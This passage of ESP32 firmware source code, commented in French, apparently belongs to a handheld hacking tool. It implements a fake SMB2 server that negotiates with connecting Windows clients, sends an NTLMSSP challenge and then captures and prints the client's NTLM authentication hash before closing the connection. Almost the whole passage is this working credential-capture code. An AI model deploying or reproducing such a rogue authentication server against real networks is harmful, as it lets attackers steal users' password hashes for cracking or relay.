                  Serial.println(F("Requête SMB2 Negotiate receivede."));
                  // Construire et envoyer la réponse SMB2 Negotiate (sélection SMB2.1)
                  // Copier l'en-tête du client pour le renvoyer modifié
                  uint8_t resp[128];
                  // NetBIOS header
                  resp[0] = 0x00;
                  // On remplira la longueur plus tard
                  // SMB2 header (64 octets)
                  memcpy(resp + 4, packet, 64);
                  // Marquer comme réponse
                  resp[4 + 4] = 0x40; resp[4 + 5] = 0x00; // StructureSize (non utilisé pour header)
                  // Flags: bit0 (ServerToRedir) = 1
                  resp[4 + 16] = packet[16] | 0x01;
                  // Status = 0 (succès)
                  *(uint32_t*)(resp + 4 + 8) = 0x00000000;
                  // Crédit accordé (conserver celui demandé ou au moins 1)
                  resp[4 + 14] = packet[14];
                  resp[4 + 15] = packet[15];
                  if (resp[4 + 14] == 0 && resp[4 + 15] == 0) {
                    resp[4 + 14] = 0x01;
                    resp[4 + 15] = 0x00;
                  }
                  // SessionId = 0 (pas encore de session établie)
                  memset(resp + 4 + 40, 0, 8);
                  // Command reste 0x0000, MessageId idem (copié)
                  // TreeId peut rester comme dans la requête (pas utilisé)
                  // Préparer le corps Negotiate Response
                  // StructureSize = 65 (0x41)
                  resp[4 + 64] = 0x41;
                  resp[4 + 65] = 0x00;
                  // SecurityMode: 0x01 (signing enabled, not required)
                  resp[4 + 66] = 0x01;
                  resp[4 + 67] = 0x00;
                  // Dialect = 0x0210 (Little-endian: 0x10 0x02)
                  resp[4 + 68] = 0x10;
                  resp[4 + 69] = 0x02;
                  // Reserved
                  resp[4 + 70] = 0x00;
                  resp[4 + 71] = 0x00;
                  // Server GUID (16 octets) - on peut utiliser l'adresse MAC pour uniq.
                  uint8_t mac[6];
                  WiFi.macAddress(mac);
                  uint8_t serverGuid[16] = {
                    /* MAC1, MAC2, MAC3, MAC4, MAC5, MAC6, */
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                  };
                  WiFi.macAddress(serverGuid);
                  memcpy(resp + 4 + 72, serverGuid, 16);
                  // Copier MAC dans GUID (les 6 premiers octets)
                  memcpy(resp + 4 + 72, mac, 6);
                  // Capabilities = 0 (pas de DFS, pas de multi-crédit)
                  *(uint32_t*)(resp + 4 + 88) = 0x00000000;
                  // MaxTransaction, MaxRead, MaxWrite = 65536 (0x10000)
                  *(uint32_t*)(resp + 4 + 92) = 0x00010000;
                  *(uint32_t*)(resp + 4 + 96) = 0x00010000;
                  *(uint32_t*)(resp + 4 + 100) = 0x00010000;
                  // Current System Time (8 bytes) et Boot Time (8 bytes) à 0 (ou on pourrait mettre heure réelle)
                  memset(resp + 4 + 104, 0, 16);
                  // SecurityBufferOffset et Length = 0 (pas de token de sécurité dans Negotiate)
                  resp[4 + 120] = 0x00; resp[4 + 121] = 0x00;
                  resp[4 + 122] = 0x00; resp[4 + 123] = 0x00;
                  // Calculer longueur SMB2 message (64 + 65 = 129 octets)
                  uint32_t smb2Len = 64 + 65;
                  resp[1] = (smb2Len >> 16) & 0xFF;
                  resp[2] = (smb2Len >> 8) & 0xFF;
                  resp[3] = smb2Len & 0xFF;
                  // Envoyer
                  smbState.client.write(resp, 4 + smb2Len);
                  Serial.println(F("SMB2 Negotiate answer send (Dialect SMB2.1)."));
                }
                // Session Setup Request
                else if (command == 0x0001) {
                  // Extraire la charge de sécurité (NTLMSSP) de la requête
                  // Chercher "NTLMSSP"
                  int ntlmIndex = -1;
                  for (uint32_t i = 0; i < smbLength - 7; ++i) {
                    if (memcmp(packet + i, "NTLMSSP", 7) == 0) {
                      ntlmIndex = i;
                      break;
                    }
                  }
                  if (ntlmIndex >= 0 && ntlmIndex + 8 < smbLength) {
                    uint8_t ntlmMsgType = packet[ntlmIndex + 8];
                    if (ntlmMsgType == 1) {
                      // Type 1: NTLMSSP Negotiate
                      Serial.println(F("NTLMSSP Type 1 received, sending Type 2 (challenge)..."));

                      // 1) Génère un challenge aléatoire de 8 octets
                      for (int i = 0; i < 8; ++i) {
                        smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
                      }

                      // 2) Construit dynamiquement le blob NTLM Type 2
                      buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);

                      // 3) Conserve un SessionId unique
                      smbState.sessionId = ((uint64_t)esp_random() << 32) | esp_random();
                      if (smbState.sessionId == 0) smbState.sessionId = 1;

                      // 4) Prépare le SMB2 Session Setup Response + blob
                      uint8_t resp[600] = {0};

                      // — NetBIOS header (longueur calculée plus bas)
                      resp[0] = 0x00;

                      // — Copie l’en-tête SMB2 receivede
                      memcpy(resp + 4, packet, 64);

                      // — Marque en réponse
                      resp[4 + 16] = packet[16] | 0x01;              // ServerToRedir
                      *(uint32_t*)(resp + 4 + 8)  = 0xC0000016;      // STATUS_MORE_PROCESSING_REQUIRED

                      // — Crédits et IDs
                      resp[4 + 14] = packet[14];
                      resp[4 + 15] = packet[15];
                      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;

                      // — Corps Session Setup
                      resp[4 + 64] = 0x09;  // StructureSize
                      resp[4 + 65] = 0x00;
                      resp[4 + 66] = 0x00;  // SessionFlags
                      resp[4 + 67] = 0x00;

                      // — Offset et longueur du blob
                      *(uint16_t*)(resp + 4 + 68) = 0x48;            // SecurityBufferOffset = 72
                      *(uint16_t*)(resp + 4 + 70) = ntlmType2Len;    // SecurityBufferLength

                      // — Padding
                      resp[4 + 72] = resp[4 + 73] = 0x00;

                      // 5) Copie le blob généré
                      memcpy(resp + 4 + 72, ntlmType2Buffer, ntlmType2Len);

                      // 6) Calcule et écrit la longueur NetBIOS
                      uint32_t smb2Len = 64 + 9 + ntlmType2Len;
                      resp[1] = (smb2Len >> 16) & 0xFF;
                      resp[2] = (smb2Len >>  8) & 0xFF;
                      resp[3] =  smb2Len        & 0xFF;

                      // 7) Envoie la réponse
                      smbState.client.write(resp, 4 + smb2Len);
                      Serial.println(F("Type 2 dynamique send. Waiting for Type 3..."));
                    }
                    else if (ntlmMsgType == 3) {
                      // Type 3 : NTLMSSP Authenticate (SMB v2)
                      Serial.println(F("NTLMSSP Type 3 received, checking for hash..."));
                      extractAndPrintHash(packet,            // pointeur début paquet
                                          smbLength,         // longueur totale SMB
                                          packet + ntlmIndex // pointeur début NTLMSSP
                                         );

                      // --- réponse finale SMB2 « success » puis fermeture ----------
                      uint8_t resp[100];
                      resp[0] = 0x00;                        // NBSS
                      memcpy(resp + 4, packet, 64);          // header copié
                      resp[4 + 16] = packet[16] | 0x01;      // ServerToRedir
                      *(uint32_t*)(resp + 4 + 8) = 0x00000000;       // STATUS_SUCCESS
                      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;
                      resp[4 + 64] = 0x09;  resp[4 + 65] = 0x00;     // StructureSize
                      resp[4 + 66] = 0x00; resp[4 + 67] = 0x00;     // SessionFlags
                      resp[4 + 68] = 0x48; resp[4 + 69] = 0x00;     // SecBufOffset
                      resp[4 + 70] = 0x00; resp[4 + 71] = 0x00;     // SecBufLen
                      resp[4 + 72] = resp[4 + 73] = 0x00;           // padding

                      uint32_t smb2Len = 64 + 9;
                      resp[1] = (smb2Len >> 16) & 0xFF;
                      resp[2] = (smb2Len >>  8) & 0xFF;
                      resp[3] =  smb2Len        & 0xFF;

                      smbState.client.write(resp, 4 + smb2Len);
                      smbState.client.stop();
                      smbState.active = false;
                      Serial.println(F("Session SMB finnished."));
                    }
                  }
                }
                // Tree Connect ou autre commande après authent (optionnel, ici on ferme la connexion donc probablement sans objet)
                else if (command == 0x0003) {
                  // Tree Connect Request (après authent réussie)
                  Serial.println(F("Receive Tree Connect (ressource acces). End of session."));
                  smbState.client.stop();
                  smbState.active = false;
                }
              } else if (packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
                Serial.println(F("Paquet SMBv1 received."));
                handleSMB1(packet, smbLength);
                continue;
              }
            }
            free(packet);
          }
        }
      }
    }
  }

  if (smbState.active && !smbState.client.connected()) {
    smbState.client.stop();
    smbState.active = false;
    Serial.println(F("Client SMB disconnected."));
  }
}

  //waitAndReturnToMenu("Return to menu");
  returnToMenu = true;
}

